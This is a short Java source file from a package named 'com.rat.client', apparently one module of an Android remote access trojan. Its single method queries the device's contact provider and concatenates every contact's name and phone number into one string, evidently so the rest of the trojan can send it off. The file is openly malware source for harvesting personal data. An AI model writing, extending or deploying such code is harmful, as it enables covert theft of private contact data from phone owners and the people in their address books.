package com.rat.client;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;

public class Contacts {
    public static String dump(Context ctx) {
        try {
            Cursor c = ctx.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
            StringBuilder sb = new StringBuilder();
            while (c.moveToNext()) {
                sb.append(c.getString(c.getColumnIndex(
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)))
                  .append(": ")
                  .append(c.getString(c.getColumnIndex(
                    ContactsContract.CommonDataKinds.Phone.NUMBER)))
                  .append("\n");
            }
            c.close();
            return sb.toString();
        } catch (Exception e) {
            return "ERR:" + e.getMessage();
        }
    }
}
